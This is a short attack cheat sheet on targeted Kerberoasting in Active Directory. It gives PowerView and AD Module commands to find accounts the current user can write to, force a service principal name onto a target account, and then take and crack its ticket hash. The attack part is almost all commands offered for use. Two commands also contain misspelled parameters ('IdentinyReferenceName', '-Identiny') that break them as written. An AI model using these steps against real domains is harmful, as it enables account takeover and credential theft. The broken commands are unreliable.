**WHAT IS THIS?:**
If we have enough permissions, i.e. `GenericAll`/`GenericWrite`, we can set a SPN on a target account, request a TGS, then grab its hash/blob and bruteforce it.

---

# PowerView
- Check for interesting permissions on accounts:
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
```

- Check if current user has already set an SPN:
```powershell
Get-DomainUser -Identity <UserName> | select serviceprincipalname
```

- Force set the SPN on the account:
```powershell
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
```

- Finally use any tool from before to grab the hash and kerberoast it!

---

# AD Module
- Check if current user has already set an SPN:
```powershell
Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
```

- Force set the SPN on the account:
```powershell
Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
```

- Finally use any tool from before to grab the hash and kerberoast it!